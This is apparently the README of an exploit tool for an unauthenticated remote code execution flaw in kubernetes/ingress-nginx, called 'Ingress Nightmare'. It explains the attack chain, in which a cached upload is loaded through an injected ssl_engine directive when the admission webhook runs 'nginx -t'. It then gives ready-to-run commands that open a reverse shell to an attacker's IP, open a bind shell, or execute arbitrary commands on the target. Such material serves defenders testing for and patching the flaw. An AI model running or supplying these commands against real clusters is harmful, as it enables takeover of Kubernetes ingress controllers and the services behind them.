# Ingress Nightmare CVE-2025-1907

## Description

This vulnerability allows remote attackers to execute arbitrary 
code on affected installations of kubernetes/ingress-nginx.
Authentication is not required to exploit this vulnerability.
The specific flaw exists within the handling of HTTP requests.

It is triggered by sending two request. One is a long buffered 
request to the NGINX server in same pod, then nginx will cache
it as a temporary file. The second request is a request to the
admission validating webhook server, which will trigger the 
admission webhook to write a temporary nginx config which contains
the `ssl_engine badso_location;` directive. Then the admission 
webhook will run `nginx -t` to check the config, which will 
triggered remote code execution in the context of the NGINX server.

## Exploitation

```bash
# reverse shell 
./ingressnightmare -m r -r ${ur_ip} -p ${port} -i ${INGRESS} -u ${UPLOADER} 

# bind shell # maybe lost?
./ingressnightmare -m b -b ${port} -i ${INGRESS} -u ${UPLOADER} 

# blind command execution
./ingressnightmare -m c  -c 'date >> /tmp/pwn; echo eson pwn >> /tmp/pwn' -i ${INGRESS} -u ${UPLOADER} 
```

https://github.com/user-attachments/assets/415d6b81-b907-4aaa-bd99-18640bd64b2b


